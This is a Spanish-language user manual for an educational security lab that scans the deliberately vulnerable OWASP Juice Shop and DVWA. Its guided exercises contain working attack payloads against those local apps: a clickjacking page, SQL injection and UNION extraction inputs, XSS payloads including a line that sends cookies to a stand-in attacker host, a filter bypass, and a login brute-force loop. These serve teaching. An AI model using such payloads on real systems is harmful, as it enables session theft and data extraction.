# Manual de Usuario — Scan Agent Lab

**Versión:** 3.0  
**Audiencia:** Estudiantes de desarrollo de aplicaciones web y APIs REST  
**Requisito previo:** Docker Desktop instalado y funcionando

---

## Tabla de Contenidos

1. [Requisitos](#1-requisitos)
2. [Instalación y primer arranque](#2-instalación-y-primer-arranque)
3. [Descripción del entorno de laboratorio](#3-descripción-del-entorno-de-laboratorio)
4. [Usar la interfaz web](#4-usar-la-interfaz-web)
5. [Usar el CLI](#5-usar-el-cli)
6. [Perfiles de escaneo](#6-perfiles-de-escaneo)
7. [Interpretar los reportes](#7-interpretar-los-reportes)
8. [OWASP API Security Top 10](#8-owasp-api-security-top-10)
9. [Base de conocimiento CVE](#9-base-de-conocimiento-cve)
10. [Solución de problemas](#10-solución-de-problemas)
11. [Referencia rápida](#11-referencia-rápida)
12. [Ejercicios prácticos guiados](#12-ejercicios-prácticos-guiados)

---

## 1. Requisitos

### Software obligatorio

| Requisito | Versión mínima | Verificación |
|-----------|---------------|--------------|
| Docker Desktop | 20.10 | `docker --version` |
| Docker Compose | 2.0 | `docker compose version` |

### Puertos que deben estar libres

| Puerto | Servicio |
|--------|---------|
| 8080 | Scan Agent Web UI |
| 3000 | OWASP Juice Shop |
| 8081 | DVWA |

### Recursos del sistema

- RAM: mínimo 4 GB disponibles para Docker
- Disco: 8 GB libres (imágenes Docker)
- Red: conexión a internet para el primer arranque (descarga de imágenes)

---

## 2. Instalación y primer arranque

### Paso 1 — Clonar el repositorio

```bash
git clone https://github.com/pater8715/scan-agent.git
cd scan-agent
```

### Paso 2 — Arrancar el laboratorio

```bash
# Con Make (recomendado)
make lab-start

# O directamente con Docker Compose
docker compose -f docker/docker-compose.yml --profile lab up -d
```

La primera vez este comando descarga las imágenes Docker (~2 GB). Puede tardar varios minutos dependiendo de la conexión.

### Paso 3 — Verificar que todo está corriendo

```bash
make lab-status
```

Resultado esperado:

```
NAMES            STATUS          PORTS
scan-agent-web   Up (healthy)    0.0.0.0:8080->8080/tcp
juice-shop       Up              0.0.0.0:3000->3000/tcp
dvwa             Up              0.0.0.0:8081->80/tcp
dvwa-db          Up              3306/tcp
```

Todos los contenedores deben mostrar `Up`. Si alguno aparece como `Restarting`, consulta la sección [Solución de problemas](#10-solución-de-problemas).

### Paso 4 — Configurar DVWA (solo la primera vez)

1. Abre http://localhost:8081 en el navegador
2. Inicia sesión con `admin` / `password`
3. Ve a http://localhost:8081/setup.php
4. Haz clic en **"Create / Reset Database"**
5. Vuelve al login e ingresa de nuevo con `admin` / `password`

### Paso 5 — Acceder a los servicios

| Servicio | URL | Credenciales |
|---------|-----|-------------|
| Scan Agent | http://localhost:8080 | — |
| Juice Shop | http://localhost:3000 | Registrar cuenta nueva |
| DVWA | http://localhost:8081 | admin / password |
| API Docs | http://localhost:8080/api/docs | — |

---

## 3. Descripción del entorno de laboratorio

```
┌─────────────────────────────────────────────────────┐
│                  Red Docker interna                  │
│                                                      │
│  ┌──────────────┐   escanea   ┌──────────────────┐  │
│  │ scan-agent   │ ──────────► │  juice-shop      │  │
│  │ :8080        │             │  :3000           │  │
│  │              │ ──────────► │  dvwa            │  │
│  └──────────────┘             │  :8081           │  │
│                               └──────────────────┘  │
│                               ┌──────────────────┐  │
│                               │  dvwa-db (MySQL) │  │
│                               │  :3306 (interno) │  │
│                               └──────────────────┘  │
└─────────────────────────────────────────────────────┘
         ▲ acceso desde navegador
```

### Scan Agent

Herramienta de análisis que orquesta múltiples escáneres:

- **nmap** — descubrimiento de puertos y versiones de servicios
- **nikto** — detección de vulnerabilidades web conocidas
- **gobuster** — enumeración de rutas y directorios
- **módulo propio** — pruebas OWASP API Security Top 10 2023

### OWASP Juice Shop

Aplicación NodeJS moderna diseñada para ser vulnerable. Contiene más de 100 retos de seguridad que cubren el OWASP Web Top 10 2021. Es el objetivo principal del laboratorio para vulnerabilidades web.

### DVWA (Damn Vulnerable Web Application)

Aplicación PHP clásica con vulnerabilidades organizadas por módulo y nivel de dificultad (Low / Medium / High / Impossible). Ideal para entender SQLi, XSS, Command Injection y otros ataques en forma progresiva.

---

## 4. Usar la interfaz web

### Pantalla principal

Al abrir http://localhost:8080 verás tres secciones:

1. **Formulario de escaneo** — donde se configura y lanza un nuevo escaneo
2. **Historial** — lista de escaneos anteriores con sus resultados
3. **Dashboard** — resumen visual de vulnerabilidades encontradas

### Lanzar un escaneo

**Campos del formulario:**

| Campo | Descripción | Ejemplo para el lab |
|-------|-------------|---------------------|
| Target | IP, hostname o URL del objetivo | `juice-shop` |
| Profile | Tipo de escaneo (ver sección 6) | `lab` |
| Description | Nota opcional para identificar el escaneo | `Práctica clase 3` |

> **Nota sobre el target en el lab:** Dentro de Docker, los contenedores se comunican por nombre. Usa `juice-shop` o `dvwa` como target en lugar de `localhost`.

**Pasos:**

1. Escribe `juice-shop` en el campo Target
2. Selecciona el perfil **Lab**
3. Opcionalmente añade una descripción
4. Haz clic en **Start Scan**
5. El progreso se muestra en tiempo real

### Ver resultados

Una vez terminado el escaneo:

1. El resultado aparece automáticamente en pantalla
2. Puedes descargarlo en los formatos disponibles: **HTML**, **JSON**, **TXT**, **Markdown**
3. El reporte HTML es el más completo — se abre en el navegador con diseño visual

### Historial de escaneos

- En la sección "Historial" puedes ver todos los escaneos anteriores
- Haz clic en cualquier escaneo para ver su reporte completo
- Puedes filtrar por target, fecha o perfil

### API Docs (Swagger)

Accede a http://localhost:8080/api/docs para ver y probar todos los endpoints REST disponibles directamente desde el navegador.

---

## 5. Usar el CLI

El CLI permite ejecutar escaneos directamente desde la terminal, útil para automatización y para ver la salida en tiempo real.

### Dentro de Docker (recomendado en el lab)

```bash
# Escaneo rápido de Juice Shop
docker compose -f docker/docker-compose.yml --profile cli run --rm scan-agent-cli \
  --target juice-shop --profile lab

# Escaneo de API con OWASP API Top 10 2023
docker compose -f docker/docker-compose.yml --profile cli run --rm scan-agent-cli \
  --target juice-shop --profile api-owasp

# Ver todos los perfiles disponibles
docker compose -f docker/docker-compose.yml --profile cli run --rm scan-agent-cli \
  --help
```

### Targets Make disponibles

```bash
make lab-scan-juice    # Escanea Juice Shop con perfil lab
make lab-scan-dvwa     # Escanea DVWA con perfil lab
```

### Opciones principales del CLI

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--target` | IP o hostname objetivo | `--target juice-shop` |
| `--profile` | Perfil de escaneo | `--profile lab` |
| `--format` | Formato del reporte | `--format html` |
| `--description` | Descripción del escaneo | `--description "Clase 4"` |
| `--output-dir` | Carpeta de salida | `--output-dir ./reports` |
| `--update-db` | Actualizar base CVE/KEV | `--update-db` |
| `--web` | Iniciar en modo web UI | `--web --port 8080` |

---

## 6. Perfiles de escaneo

| Perfil | Descripción | Tiempo estimado | Uso recomendado |
|--------|-------------|-----------------|-----------------|
| `quick` | Puertos más comunes + versiones | 2-5 min | Primera exploración |
| `standard` | Escaneo completo de puertos y servicios | 10-15 min | Escaneo de referencia |
| `full` | Todo: puertos, versiones, scripts NSE, directorios | 30-60 min | Análisis exhaustivo |
| `web` | Foco en HTTP/HTTPS + nikto + gobuster | 10-20 min | Aplicaciones web |
| `api` | Endpoints REST + headers de seguridad API | 5-10 min | APIs REST generales |
| `api-owasp` | OWASP API Security Top 10 2023 completo | 10-20 min | Auditoría de APIs |
| `lab` | Optimizado para Juice Shop y DVWA | 10-15 min | **Uso en el lab** |
| `stealth` | Escaneo lento para evitar detección | 20-40 min | Entornos con IDS |
| `network` | Descubrimiento de hosts y topología de red | 5-10 min | Redes locales |
| `compliance` | Verifica controles de seguridad específicos | 15-25 min | Auditorías formales |

> Para el laboratorio, el perfil **`lab`** es el punto de partida ideal. Cubre web y API con una intensidad balanceada.

---

## 7. Interpretar los reportes

### Estructura del reporte HTML

El reporte HTML tiene estas secciones:

1. **Resumen ejecutivo** — puntuación de riesgo general, conteo por severidad
2. **Información del objetivo** — puertos abiertos, servicios detectados, versiones
3. **Hallazgos de vulnerabilidades** — lista ordenada por severidad
4. **Recomendaciones** — acciones de remediación por hallazgo

### Niveles de severidad

| Nivel | Color | CVSS | Qué significa |
|-------|-------|------|---------------|
| CRITICAL | Rojo oscuro | 9.0 – 10.0 | Explotable de forma directa, impacto total |
| HIGH | Rojo | 7.0 – 8.9 | Vulnerabilidad seria con impacto significativo |
| MEDIUM | Naranja | 4.0 – 6.9 | Riesgo real, requiere condiciones adicionales |
| LOW | Amarillo | 0.1 – 3.9 | Riesgo menor, difícil de explotar |
| INFO | Azul | 0.0 | No es vulnerabilidad, pero es información útil |

### Cómo leer un hallazgo

Cada hallazgo muestra:

```
┌─────────────────────────────────────────────────┐
│ [HIGH] Missing X-Frame-Options Header           │
│ ─────────────────────────────────────────────── │
│ OWASP: A05 Security Misconfiguration            │
│ CWE: CWE-1021                                   │
│                                                 │
│ Descripción:                                    │
│ El encabezado X-Frame-Options no está           │
│ configurado, permitiendo ataques de             │
│ clickjacking.                                   │
│                                                 │
│ Remediación:                                    │
│ Añadir el header: X-Frame-Options: DENY         │
└─────────────────────────────────────────────────┘
```

### Falsos positivos

No todos los hallazgos son vulnerabilidades reales. Siempre **verifica manualmente** los hallazgos críticos antes de dar por confirmada una vulnerabilidad:

1. Lee la descripción completa del hallazgo
2. Intenta reproducirlo manualmente en el navegador o con curl
3. Si no puedes reproducirlo, probablemente es un falso positivo

### Comparar escaneos

Para ver el progreso después de aplicar correcciones:

1. Ejecuta un escaneo inicial → descarga el reporte como referencia
2. Aplica los cambios de seguridad en la aplicación
3. Ejecuta un segundo escaneo con la misma configuración
4. Compara los reportes — los hallazgos resueltos no deberían aparecer

---

## 8. OWASP API Security Top 10

El perfil `api-owasp` ejecuta pruebas específicas para las 10 vulnerabilidades más críticas en APIs REST según OWASP 2023.

### Las 10 categorías

| ID | Nombre | Qué detecta Scan Agent |
|----|--------|------------------------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) | Acceso cruzado de IDs numéricos |
| API2 | Broken Authentication | JWT con algoritmo `none`, fuerza bruta sin bloqueo |
| API3 | Broken Object Property Level Authorization | Campos sensibles en respuestas, mass assignment |
| API4 | Unrestricted Resource Consumption | Ausencia de rate limiting en endpoints |
| API5 | Broken Function Level Authorization | Endpoints admin/privilegiados sin autenticación |
| API6 | Unrestricted Access to Sensitive Business Flows | Funciones críticas (pagos, votos) sin protección |
| API7 | Server-Side Request Forgery | Parámetros de URL sin validar (`url`, `redirect`, `webhook`) |
| API8 | Security Misconfiguration | CORS abierto, headers faltantes, errores verbose |
| API9 | Improper Inventory Management | Múltiples versiones de API activas, endpoints debug |
| API10 | Unsafe Consumption of APIs | Open redirects, consumo de APIs externas sin validación |

### Cómo ejecutar un escaneo de API

```bash
# Desde la Web UI: seleccionar perfil "api-owasp"
# Desde el CLI:
docker compose -f docker/docker-compose.yml --profile cli run --rm scan-agent-cli \
  --target juice-shop --profile api-owasp
```

Juice Shop tiene varias de estas vulnerabilidades en su API REST — es un objetivo excelente para practicar con este perfil.

---

## 9. Base de conocimiento CVE

Scan Agent enriquece automáticamente sus hallazgos consultando bases de datos de vulnerabilidades externas.

### Fuentes integradas

| Fuente | Descripción | TTL caché |
|--------|-------------|-----------|
| NVD (NIST) | Base oficial de CVEs con CVSS scores | 24 horas |
| CISA KEV | CVEs activamente explotados en producción | 12 horas |
| OSV (osv.dev) | Vulnerabilidades en librerías y paquetes | 24 horas |

### Cuándo se activa

- Cuando el escaneo detecta un CVE en el banner de un servicio (ej: `Apache 2.4.49`)
- Cuando nikto reporta una vulnerabilidad con ID conocido
- El enriquecimiento es automático — no requiere configuración

### Actualizar la base de datos manualmente

```bash
# Actualiza CISA KEV y purga caché expirada
python3 scripts/scan-agent.py --update-db

# O desde Docker
docker compose -f docker/docker-compose.yml --profile cli run --rm scan-agent-cli \
  --update-db
```

### Indicador KEV en el reporte

Si un CVE detectado está en el catálogo CISA KEV (Known Exploited Vulnerabilities), el hallazgo se escala automáticamente a **CRITICAL** y aparece marcado con una advertencia especial en el reporte. Esto indica que la vulnerabilidad tiene explotación activa documentada en el mundo real.

---

## 10. Solución de problemas

### Un contenedor aparece como `Restarting`

```bash
# Ver los logs del contenedor problemático
docker logs <nombre-contenedor>

# Ejemplos
docker logs dvwa
docker logs juice-shop
docker logs dvwa-db
```

**dvwa-db en loop de restart:**  
Limpiar el volumen de datos e intentar de nuevo:
```bash
docker compose -f docker/docker-compose.yml --profile lab down --volumes
docker compose -f docker/docker-compose.yml --profile lab up -d
```

**juice-shop falla con error de Node.js:**  
Verificar que se usa la versión `v17.1.1` de la imagen (no `latest`):
```bash
docker compose -f docker/docker-compose.yml --profile lab pull juice-shop
```

### No puedo acceder a http://localhost:3000

1. Verifica que el contenedor esté corriendo: `make lab-status`
2. Verifica que el puerto 3000 no esté ocupado por otro proceso:
   ```bash
   # Windows
   netstat -ano | findstr :3000
   # Linux/Mac
   lsof -i :3000
   ```
3. Si hay conflicto de puerto, cambia el mapeo en `docker/docker-compose.yml`

### El escaneo falla o no produce resultados

1. Confirma que el target existe y está corriendo:
   ```bash
   docker exec scan-agent-web curl -s -o /dev/null -w "%{http_code}" http://juice-shop:3000
   ```
   Debe responder `200`.

2. Verifica que usas el nombre correcto del contenedor como target (no `localhost`):
   - Correcto: `juice-shop`, `dvwa`
   - Incorrecto: `localhost:3000`, `127.0.0.1`

3. Revisa los logs del contenedor scan-agent-web:
   ```bash
   docker logs scan-agent-web --tail 50
   ```

### DVWA no permite acceder después de setup

1. Asegúrate de haber completado el setup: http://localhost:8081/setup.php
2. Haz clic en **"Create / Reset Database"**
3. Vuelve a http://localhost:8081 e inicia sesión con `admin` / `password`

### Scan Agent aparece como `unhealthy` en Docker

El servicio funciona aunque Docker lo marque como unhealthy. Puedes verificarlo:
```bash
curl http://localhost:8080/health
# Debe responder: {"status":"healthy","version":"1.0.0"}
```

### Liberar recursos después del laboratorio

```bash
# Solo detener contenedores (conserva datos)
make lab-stop

# Detener y eliminar volúmenes (libera espacio)
docker compose -f docker/docker-compose.yml --profile lab down --volumes

# Eliminar todas las imágenes del proyecto
docker rmi scan-agent:3.0.0 bkimminich/juice-shop:v17.1.1
```

---

## 11. Referencia rápida

### Comandos Make

```bash
make lab-start          # Iniciar el laboratorio completo
make lab-stop           # Detener el laboratorio
make lab-status         # Ver estado de los contenedores
make lab-scan-juice     # Escanear Juice Shop (perfil lab)
make lab-scan-dvwa      # Escanear DVWA (perfil lab)
make build              # Reconstruir la imagen de Scan Agent
make logs-web           # Ver logs de la interfaz web en tiempo real
make help               # Listar todos los comandos disponibles
```

### URLs del laboratorio

| URL | Servicio |
|-----|---------|
| http://localhost:8080 | Scan Agent — Web UI |
| http://localhost:8080/api/docs | Scan Agent — API Swagger |
| http://localhost:8080/health | Scan Agent — Health check |
| http://localhost:3000 | OWASP Juice Shop |
| http://localhost:8081 | DVWA |
| http://localhost:8081/setup.php | DVWA — Configuración inicial |
| http://localhost:8081/security.php | DVWA — Cambiar nivel de dificultad |

### Targets de escaneo válidos (dentro de Docker)

| Valor | Apunta a |
|-------|---------|
| `juice-shop` | OWASP Juice Shop en puerto 3000 |
| `dvwa` | DVWA en puerto 80 (mapeado a 8081) |

### Credenciales del lab

| Servicio | Usuario | Contraseña |
|---------|---------|-----------|
| DVWA | `admin` | `password` |
| Juice Shop | Registrar cuenta nueva en /#/register | — |

---

---

## 12. Ejercicios prácticos guiados

Esta sección contiene ejercicios ejecutables paso a paso. Todos los comandos funcionan con el laboratorio arriba (`make lab-start`). El flujo general de cada ejercicio es:

```
Escanear → Leer reporte → Verificar manualmente → Entender el riesgo
```

> **Antes de empezar:** verifica que el lab esté corriendo con `make lab-status`. Todos los contenedores deben estar `Up`.

---

### Ejercicio 1 — Mi primer escaneo (10 min)

**Objetivo:** ejecutar el primer escaneo y familiarizarse con la salida.  
**OWASP:** A05 Security Misconfiguration, A07 Identification and Authentication Failures

#### Paso 1 — Lanzar el escaneo

```bash
make lab-scan-juice
```

O con Docker directamente:

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile lab
```

#### Paso 2 — Qué observar en la salida

Mientras corre, verás las fases del pipeline:

```
FASE 0: EJECUCIÓN DE ESCANEO
  [1/2] Ejecutando nmap...   ✅ Completado en 1.2s
  [2/2] Ejecutando curl...   ✅ Completado en 0.1s

FASE 1: PARSING DE ARCHIVOS
  [OK] Parseado: headers_juice-shop:3000.txt - 15 headers encontrados

FASE 2: ANÁLISIS E INTERPRETACIÓN
  [EDU] 12 vulnerabilidades enriquecidas con datos educativos
  Vulnerabilidades totales: 18

FASE 3: GENERACIÓN DE INFORMES
  [OK] Informe HTML generado: informe_tecnico.html
```

#### Paso 3 — Verificar manualmente los headers detectados

Scan Agent detectará que Juice Shop tiene headers de seguridad faltantes. Confírmalo tú mismo:

```bash
# Desde tu máquina (fuera de Docker)
curl -I http://localhost:3000
```

Salida esperada — nota los headers que **faltan**:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
# ← NO hay X-Frame-Options
# ← NO hay Content-Security-Policy
# ← NO hay Strict-Transport-Security
```

Compara con un servidor bien configurado que sí los tendría.

---

### Ejercicio 2 — Leer el informe educativo (15 min)

**Objetivo:** usar el formato `educational` para entender por qué cada vulnerabilidad es peligrosa.  
**OWASP:** todas las categorías detectadas en el escaneo anterior

#### Paso 1 — Generar el informe educativo

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile lab --format educational
```

El archivo generado se llama `informe_educativo.html` en el directorio de trabajo del contenedor. Para abrirlo en tu máquina, copia el archivo o usa la Web UI (http://localhost:8080) que lo entrega como descarga.

#### Paso 2 — Navegar las tarjetas

Cada tarjeta en el informe educativo tiene tres secciones expandibles. Haz clic en la primera vulnerabilidad que encuentres:

| Sección | Qué muestra |
|---------|-------------|
| ⚠️ ¿Por qué es peligroso? | Consecuencia real en producción |
| 🔍 Ejemplo de ataque | Payload o script concreto |
| 🛠️ Cómo remediarlo | Código de configuración correcto |

#### Paso 3 — Discusión en clase

Para cada vulnerabilidad que encuentres, responde:
1. ¿Qué dato o funcionalidad quedaría expuesto?
2. ¿El ejemplo de ataque del reporte es automático o requiere interacción del usuario?
3. ¿La remediación se haría en el servidor, el código, o la configuración?

---

### Ejercicio 3 — Headers de seguridad HTTP (20 min)

**Objetivo:** detectar, confirmar y entender los headers de seguridad HTTP faltantes.  
**OWASP:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-693 — Protection Mechanism Failure

#### Paso 1 — Comparar Juice Shop vs un sitio bien configurado

```bash
# Headers de Juice Shop (inseguro):
curl -I http://localhost:3000 2>/dev/null | grep -E "^(X-Frame|Content-Security|Strict-Transport|X-Content-Type|Referrer)"

# Headers de example.com como referencia (abre en navegador o con curl):
curl -I https://example.com 2>/dev/null | grep -E "^(X-Frame|Content-Security|Strict-Transport|X-Content-Type|Referrer)"
```

En Juice Shop no deberías ver ningún resultado — ningún header de seguridad está configurado.

#### Paso 2 — Simular un ataque de clickjacking

Crea un archivo `clickjack_test.html` en tu máquina con este contenido:

```html
<!DOCTYPE html>
<html>
<body style="background:#fff; font-family:sans-serif; padding:50px">
  <h2>¿Ves el botón "Ganar un iPhone"? Haz clic en él.</h2>
  <div style="position:relative; width:400px; height:400px">
    <!-- El iframe "invisible" de Juice Shop encima del botón falso -->
    <iframe src="http://localhost:3000/#/login"
            style="opacity:0.0; position:absolute; top:0; left:0;
                   width:400px; height:400px; z-index:2; border:none">
    </iframe>
    <!-- Botón visible que el usuario cree que hace clic -->
    <button style="position:absolute; top:180px; left:100px;
                   padding:15px 30px; font-size:1.2em; z-index:1;
                   background:#28a745; color:white; border:none; border-radius:5px">
      🎁 Ganar un iPhone
    </button>
  </div>
  <p style="color:#666; font-size:0.85em">
    (Sube la opacidad del iframe a 0.3 para ver el efecto real)
  </p>
</body>
</html>
```

Abre el archivo en tu navegador y cambia `opacity:0.0` a `opacity:0.3` para ver Juice Shop superpuesto al botón falso. Así funciona un clickjacking.

> **Si Juice Shop tuviera** `X-Frame-Options: DENY`, el iframe simplemente no cargaría — el ataque sería imposible.

#### Paso 3 — Ejecutar el escaneo y comparar

```bash
# Escaneo enfocado en headers
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile quick
```

Busca en la salida la línea `missing_security_headers` — confirmará los headers detectados automáticamente por la herramienta.

---

### Ejercicio 4 — SQL Injection en DVWA (25 min)

**Objetivo:** escanear DVWA, detectar SQL Injection, verificarla manualmente y entender el impacto.  
**OWASP:** A03:2021 — Injection  
**CWE:** CWE-89 — Improper Neutralization of Special Elements in SQL Commands  
**Requisito:** DVWA configurado (ver sección 2, Paso 4)

#### Paso 1 — Configurar DVWA en nivel Low (más vulnerable)

1. Ve a http://localhost:8081/security.php
2. Cambia "Security Level" a **Low**
3. Haz clic en **Submit**

#### Paso 2 — Escanear DVWA

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target dvwa:80 --profile web
```

#### Paso 3 — Verificar SQL Injection manualmente

Ve a http://localhost:8081/vulnerabilities/sqli/ y en el campo "User ID" prueba estos inputs:

```
# Input 1 — ID normal (comportamiento esperado):
1

# Input 2 — comilla simple (intento de escape):
1'

# Input 3 — bypass de autenticación clásico:
1' OR '1'='1

# Input 4 — extraer todos los usuarios:
1' OR '1'='1' --
```

Con el input 3 o 4 deberías ver todos los usuarios de la base de datos. La consulta vulnerable que hay detrás es:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
-- Con input "1' OR '1'='1" se convierte en:
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
-- La condición OR '1'='1' siempre es verdadera → devuelve todos los registros
```

#### Paso 4 — Entender el impacto

Ahora intenta extraer la versión de la base de datos (información de reconocimiento):

```
1' UNION SELECT null, version() --
```

Y las tablas existentes (enumeración):

```
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --
```

> Anota qué información pudiste extraer. ¿Qué pasaría si esta base de datos tuviera datos de clientes, contraseñas o tarjetas de crédito?

#### Paso 5 — Ver el nivel de protección (Medium y High)

Cambia el nivel de seguridad en http://localhost:8081/security.php a **Medium** y repite el input `1' OR '1'='1`. Observa cómo DVWA intenta sanitizar la entrada (pero sigue siendo vulnerable con otro enfoque). Luego prueba **High**.

---

### Ejercicio 5 — Cross-Site Scripting (XSS) en DVWA (20 min)

**Objetivo:** detectar XSS reflejado, ejecutarlo en el navegador y ver el impacto en sesiones.  
**OWASP:** A03:2021 — Injection  
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation

#### Paso 1 — XSS reflejado (nivel Low)

Ve a http://localhost:8081/vulnerabilities/xss_r/ y en el campo "What's your name?" introduce:

```html
<script>alert('XSS ejecutado')</script>
```

Debes ver un pop-up con el mensaje "XSS ejecutado". El navegador ejecutó el código JavaScript que tú introdujiste.

#### Paso 2 — Robo simulado de cookie de sesión

Introduce este payload en el mismo campo:

```html
<script>alert('Tu cookie: ' + document.cookie)</script>
```

Verás tu `PHPSESSID` en el pop-up. En un ataque real, el atacante enviaría esa cookie a su servidor:

```html
<script>
  new Image().src = 'http://atacante.com/steal?c=' + document.cookie;
</script>
```

> Con esa cookie, el atacante puede iniciar sesión como tú sin necesitar tu contraseña.

#### Paso 3 — XSS almacenado (persistente)

Ve a http://localhost:8081/vulnerabilities/xss_s/ — este tipo es más peligroso porque el payload queda guardado en la base de datos y afecta a todos los usuarios que visiten la página.

En el campo "Message" introduce:

```html
<script>document.body.style.background='red'</script>
```

Recarga la página — el fondo seguirá rojo para cualquier usuario que la abra.

#### Paso 4 — Comparar con nivel Medium

Cambia a nivel Medium e intenta el mismo `<script>alert(1)</script>`. Observa que DVWA filtra `<script>` pero puedes bypasearlo con:

```html
<img src=x onerror="alert('XSS con img')">
```

Esto ilustra que los filtros simples de texto no son suficientes — hay decenas de vectores XSS posibles.

---

### Ejercicio 6 — OWASP API Security Top 10 en Juice Shop (30 min)

**Objetivo:** ejecutar el perfil `api-owasp` y analizar vulnerabilidades específicas de APIs REST.  
**OWASP API:** API1 (BOLA), API2 (Broken Auth), API4 (Rate Limiting), API8 (Misconfiguration)

#### Paso 1 — Escaneo API

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile api-owasp
```

El escaneo tarda unos 10-15 minutos porque prueba activamente los 10 controles.

#### Paso 2 — Verificar BOLA/IDOR manualmente (API1:2023)

Juice Shop tiene una API REST en `http://localhost:3000/api/`. Prueba acceder a pedidos de otros usuarios:

```bash
# Primero registra una cuenta en http://localhost:3000/#/register
# Luego inicia sesión y captura tu token JWT con las DevTools (Network tab)

# Con tu token, intenta acceder a pedidos con diferentes IDs:
TOKEN="tu_jwt_aqui"

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/Orders/1 | python3 -m json.tool

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/Orders/2 | python3 -m json.tool

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/Orders/3 | python3 -m json.tool
```

Si alguno responde datos de un pedido que no es tuyo → BOLA confirmado.

#### Paso 3 — Verificar rate limiting (API4:2023)

```bash
# Script para probar si hay rate limiting en el login
for i in $(seq 1 10); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:3000/api/Users/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrongpass"}')
  echo "Intento $i: HTTP $STATUS"
done
```

Si todos los intentos responden `401` sin bloquearse ni añadir delay → no hay rate limiting. En una API real, el endpoint debería responder `429 Too Many Requests` después de 3-5 intentos.

#### Paso 4 — Verificar documentación expuesta (API8:2023)

```bash
# Swagger/OpenAPI expuesto sin autenticación
curl -s http://localhost:3000/api-docs | python3 -m json.tool | head -40
```

Si responde con la definición OpenAPI → documentación de la API accesible públicamente sin auth. Esto revela todos los endpoints, parámetros y tipos de datos.

---

### Ejercicio 7 — Escaneo pasivo con OWASP ZAP (15 min)

**Objetivo:** usar ZAP para hacer spider + escaneo pasivo y comparar con los resultados del perfil `lab`.  
**Requisito:** laboratorio completo con ZAP arriba (`docker compose --profile lab up -d`)

#### Paso 1 — Verificar que ZAP está corriendo

```bash
curl -s "http://localhost:8090/JSON/core/view/version/?apikey=zap-scan-agent-lab" | python3 -m json.tool
```

Respuesta esperada:
```json
{
  "version": "2.15.0"
}
```

#### Paso 2 — Escaneo pasivo ZAP

```bash
docker run --rm --network scan-agent-network \
  -e ZAP_HOST=zap -e ZAP_PORT=8090 -e ZAP_API_KEY=zap-scan-agent-lab \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile zap-passive
```

Observa en la salida la progresión del spider:

```
[ZAP] Spider: 0%
[ZAP] Spider: 67%
[ZAP] Spider: 100%
[ZAP] Escaneo pasivo: 0 registros pendientes
[ZAP] Alertas: 278 total | High=0 Medium=129 Low=99 Informational=50
```

#### Paso 3 — Comparar perfiles

Ejecuta los tres perfiles sobre Juice Shop y anota los resultados:

| Perfil | Vuln. detectadas | Tiempo | Herramienta principal |
|--------|-----------------|--------|----------------------|
| `quick` | ? | ? | nmap |
| `lab` | ? | ? | nmap + curl + gobuster |
| `zap-passive` | ? | ? | OWASP ZAP |

> ¿Qué perfil detecta más vulnerabilidades? ¿Cuál es más rápido? ¿Qué detecta ZAP que los otros no?

#### Paso 4 — Inspeccionar las alertas ZAP directamente

```bash
# Ver las alertas de riesgo medio detectadas por ZAP
curl -s "http://localhost:8090/JSON/core/view/alerts/?baseurl=http://juice-shop:3000&riskid=2&apikey=zap-scan-agent-lab" \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
alerts = data.get('alerts', [])
print(f'Total alertas MEDIUM: {len(alerts)}')
for a in alerts[:5]:
    print(f'  - {a[\"name\"]}: {a[\"url\"][:60]}')
"
```

---

### Ejercicio 8 — API REST de Scan Agent (15 min)

**Objetivo:** explorar y usar la API REST de Scan Agent directamente (sin interfaz web).  
**Herramienta:** Swagger UI en http://localhost:8080/api/docs

#### Paso 1 — Ver los endpoints disponibles

Abre http://localhost:8080/api/docs en el navegador. Verás los endpoints organizados por categoría:

- `POST /api/scans/` — iniciar un escaneo
- `GET /api/scans/` — listar todos los escaneos
- `GET /api/scans/{scan_id}` — ver estado de un escaneo
- `GET /api/scans/{scan_id}/report` — descargar reporte

#### Paso 2 — Lanzar un escaneo via API con curl

```bash
# Iniciar escaneo de Juice Shop
SCAN_RESPONSE=$(curl -s -X POST http://localhost:8080/api/scans/ \
  -H "Content-Type: application/json" \
  -d '{
    "target": "juice-shop",
    "profile": "quick",
    "description": "Escaneo via API - ejercicio 8"
  }')

echo "$SCAN_RESPONSE" | python3 -m json.tool

# Guardar el scan_id para los siguientes pasos
SCAN_ID=$(echo "$SCAN_RESPONSE" | python3 -c "import json,sys; print(json.load(sys.stdin)['scan_id'])")
echo "Scan ID: $SCAN_ID"
```

#### Paso 3 — Monitorear el estado en tiempo real

```bash
# Consultar estado cada 5 segundos hasta que termine
while true; do
  STATUS=$(curl -s "http://localhost:8080/api/scans/$SCAN_ID" | python3 -c "
import json, sys
d = json.load(sys.stdin)
print(f'Estado: {d[\"status\"]} | Vulns: {d.get(\"total_vulnerabilities\", \"...\")}')")
  echo "$STATUS"
  if [[ "$STATUS" == *"completed"* ]]; then break; fi
  sleep 5
done
```

#### Paso 4 — Descargar el reporte en JSON

```bash
curl -s "http://localhost:8080/api/scans/$SCAN_ID/report?format=json" \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
vulns = data.get('vulnerabilities', [])
print(f'Total vulnerabilidades: {len(vulns)}')
print()
